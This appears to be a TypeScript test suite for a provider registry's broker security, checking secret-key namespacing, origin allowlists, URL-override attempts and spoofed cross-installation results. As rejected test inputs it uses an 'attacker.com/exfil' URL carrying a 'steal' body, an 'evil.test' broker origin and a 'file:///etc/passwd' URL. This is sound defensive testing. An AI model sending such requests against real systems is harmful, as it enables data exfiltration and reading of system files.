import { describe, expect, test } from "bun:test";
import {
  ProviderRegistry,
  parseExtensionSecretKey,
  type BrokerRequest,
  type ProviderHostToWorker,
} from "./provider-registry";

function brokerRegistry(overrides: Partial<ConstructorParameters<typeof ProviderRegistry>[0]> = {}) {
  const fetchedUrls: string[] = [];
  const registry = new ProviderRegistry({
    timeoutMs: 200,
    fetch: async (url) => {
      fetchedUrls.push(url);
      return new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    },
    ...overrides,
  });
  return { registry, fetchedUrls };
}

describe("provider broker security", () => {
  test("parseExtensionSecretKey only accepts extension:<installationId>:<name>", () => {
    expect(parseExtensionSecretKey("extension:inst-a:embedding-key")).toEqual({
      installationId: "inst-a",
      name: "embedding-key",
    });
    expect(parseExtensionSecretKey("openai_api_key")).toBeNull();
    expect(parseExtensionSecretKey("user:alice:openai_api_key")).toBeNull();
    expect(parseExtensionSecretKey("extension:inst-a:")).toBeNull();
    expect(parseExtensionSecretKey("extension::embedding-key")).toBeNull();
  });

  test("registering a broker with a global secretKey fails with authorization error", () => {
    const { registry, fetchedUrls } = brokerRegistry();
    expect(() =>
      registry.register({
        kind: "embedding",
        id: "foo",
        broker: { kind: "embedding", url: "https://provider.test/embed", secretKey: "openai_api_key" },
      }, {
        installationId: "inst-a",
        installScope: "user",
        authenticatedSubject: "alice",
      }),
    ).toThrow(/authorization denied/);
    expect(fetchedUrls).toEqual([]);
  });

  test("prepareBroker and completeBroker reject unnamespaced secretKeys before any fetch", async () => {
    const secretLookups: string[] = [];
    const { registry, fetchedUrls } = brokerRegistry({
      getSecret: async (_userId, key) => {
        secretLookups.push(key);
        return "leaked";
      },
    });

    const request: BrokerRequest = {
      kind: "embedding",
      url: "https://provider.test/embed",
      secretKey: "openai_api_key",
      correlationId: "sec-1",
    };

    let threw = false;
    try {
      const prepared = registry.prepareBroker(request, {
        installScope: "user",
        authenticatedSubject: "alice",
        installedByUserId: "alice",
        installationId: "inst-a",
      });
      await registry.completeBroker(prepared);
    } catch (err) {
      threw = true;
      expect((err as Error).message).toMatch(/authorization denied/);
    }
    expect(threw).toBe(true);
    expect(secretLookups).toEqual([]);
    expect(fetchedUrls).toEqual([]);

    // A hand-crafted prepared envelope with a global key is still rejected
    // host-side immediately before the fetch.
    await expect(
      registry.completeBroker({
        kind: "embedding",
        url: "https://provider.test/embed",
        method: "POST",
        headers: {},
        body: undefined,
        binary: false,
        secretKey: "openai_api_key",
        installationId: "inst-a",
        authenticatedSubject: "alice",
        correlationId: "sec-2",
        round: 1,
        workerView: {},
      }),
    ).rejects.toThrow(/authorization denied/);
    expect(secretLookups).toEqual([]);
    expect(fetchedUrls).toEqual([]);
  });

  test("secretKey scoped to another installation is rejected", async () => {
    const { registry } = brokerRegistry();
    expect(() =>
      registry.prepareBroker({
        kind: "tts",
        url: "https://provider.test/tts",
        secretKey: "extension:inst-b:tts-key",
        correlationId: "sec-3",
      }, {
        installScope: "user",
        authenticatedSubject: "alice",
        installedByUserId: "alice",
        installationId: "inst-a",
      }),
    ).toThrow(/does not match installation/);
  });

  test("invoke cannot override the registration-time broker url", async () => {
    const { registry, fetchedUrls } = brokerRegistry();
    registry.register({
      kind: "sidecar",
      id: "tools",
      broker: { kind: "sidecar", url: "https://good.test/v1" },
    }, {
      installationId: "inst-a",
      installScope: "user",
      authenticatedSubject: "alice",
    });

    const response = await registry.invoke(
      { effectiveScope: "user:alice", installationId: "inst-a", kind: "sidecar", id: "tools" },
      { url: "https://attacker.com/exfil", body: { steal: true } },
      { callerScope: "user:alice", correlationId: "url-1" },
    );

    expect(response).toBeTruthy();
    expect(fetchedUrls).toEqual(["https://good.test/v1"]);
  });

  test("registration rejects unapproved origins when an allowlist is configured", () => {
    const { registry } = brokerRegistry({ approvedBrokerOrigins: ["https://approved.test"] });
    expect(() =>
      registry.register({
        kind: "stt",
        id: "transcribe",
        broker: { kind: "stt", url: "https://evil.test/stt" },
      }, {
        installationId: "inst-a",
        installScope: "user",
        authenticatedSubject: "alice",
      }),
    ).toThrow(/origin is not approved/);
    // Non-http(s) schemes are rejected even without an allowlist.
    const open = brokerRegistry().registry;
    expect(() =>
      open.register({
        kind: "stt",
        id: "transcribe",
        broker: { kind: "stt", url: "file:///etc/passwd" },
      }, {
        installationId: "inst-a",
        installScope: "user",
        authenticatedSubject: "alice",
      }),
    ).toThrow(/http or https/);
  });

  test("allowlistKey must match an approved broker configuration", () => {
    const approved = brokerRegistry({ approvedAllowlistKeys: ["sidecar"] }).registry;
    const base = {
      installScope: "user" as const,
      authenticatedSubject: "alice",
      installedByUserId: "alice",
      installationId: "inst-a",
    };
    expect(() =>
      approved.prepareBroker({
        kind: "sidecar",
        url: "https://good.test/v1",
        allowlistKey: "attacker-config",
        correlationId: "al-1",
      }, base),
    ).toThrow(/not an approved broker configuration/);
    expect(
      approved.prepareBroker({
        kind: "sidecar",
        url: "https://good.test/v1",
        allowlistKey: "sidecar",
        correlationId: "al-2",
      }, base).correlationId,
    ).toBe("al-2");
  });

  test("cross-installation provider_result is rejected", async () => {
    const outboundA: ProviderHostToWorker[] = [];
    const outboundB: ProviderHostToWorker[] = [];
    const registry = new ProviderRegistry({ timeoutMs: 60 });
    registry.attachWorker("inst-a", (message) => outboundA.push(message));
    registry.attachWorker("inst-b", (message) => outboundB.push(message));
    registry.register(
      { kind: "embedding", id: "foo" },
      { installationId: "inst-a", installScope: "user", authenticatedSubject: "alice" },
    );
    registry.register(
      { kind: "embedding", id: "foo" },
      { installationId: "inst-b", installScope: "user", authenticatedSubject: "bob" },
    );

    const pending = registry.invoke(
      { effectiveScope: "user:alice", installationId: "inst-a", kind: "embedding", id: "foo" },
      { text: "hello" },
      { callerScope: "user:alice", correlationId: "x-inst-1" },
    );

    // inst-b attempts to inject a result into inst-a's invocation.
    expect(
      registry.handleProviderResult(
        {
          type: "provider_result",
          phase: "result",
          correlationId: "x-inst-1",
          round: 1,
          result: { spoofed: true },
        },
        { installationId: "inst-b", installScope: "user", installedByUserId: "bob" },
      ),
    ).toBe(false);

    // The invocation is torn down (no leak) and rejects rather than resolving
    // with the spoofed payload.
    await expect(pending).rejects.toThrow(/installation mismatch/);
    await new Promise((resolve) => setTimeout(resolve, 5));
  });

  test("timed-out invocations release their correlationId and timer", async () => {
    const outbound: ProviderHostToWorker[] = [];
    const registry = new ProviderRegistry({ timeoutMs: 25 });
    registry.attachWorker("inst-a", (message) => outbound.push(message));
    registry.register(
      { kind: "stt", id: "transcribe" },
      { installationId: "inst-a", installScope: "user", authenticatedSubject: "alice" },
    );

    const pending = registry.invoke(
      { effectiveScope: "user:alice", installationId: "inst-a", kind: "stt", id: "transcribe" },
      { audio: "bytes" },
      { callerScope: "user:alice", correlationId: "leak-1" },
    );
    await expect(pending).rejects.toThrow(/timed out/);

    // Correlation id fully released: late results find no pending entry.
    expect(
      registry.handleProviderResult(
        {
          type: "provider_result",
          phase: "result",
          correlationId: "leak-1",
          round: 1,
          result: { late: true },
        },
        { installationId: "inst-a", installScope: "user", installedByUserId: "alice" },
      ),
    ).toBe(false);
    expect(outbound.some((message) => message.type === "provider_abort")).toBe(true);
  });
});
